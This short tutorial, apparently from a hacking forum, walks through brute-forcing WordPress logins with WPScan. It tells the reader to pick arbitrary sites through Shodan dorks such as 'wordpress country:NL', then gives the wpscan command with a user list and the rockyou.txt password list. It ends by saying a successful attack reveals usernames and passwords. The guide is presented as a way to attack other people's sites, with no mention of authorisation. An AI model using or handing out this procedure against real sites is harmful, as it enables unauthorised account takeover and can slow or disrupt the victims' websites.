[1] For this tutorial we need to use "WPScan tool".

Use this command to run in first time:
                                        wpscan -h (may prompt you to make an wpscan db update, just write "y" and press enter).
                                        

[2] Find some WP site for brute force. One method for finding is via dorks and use Shodan.

How to find via shodan.io?
- use this dork "wordpress country:"NL" " (this country now it's just for example) 

[3] Open terminal and write:
wpscan --url http://WORDPRESS-SITE.com  -U users.txt -P /usr/share/wordlists/rockyou.txt

â€“URL  is URL parameter, followed by URL of the wordpress website to be scanned

-U will only bruteforce the supplied usernames, in our case it is users.txt

-P will bruteforce the passwords from the provided list rockyou.txt

The scan duration mainly depends on how large the password dictionary file is and as we are mapping a large number of users with even larger numbers of passwords it could also impact the performance of the website if left running for a long time.

After a successful attack, u will see username and password.
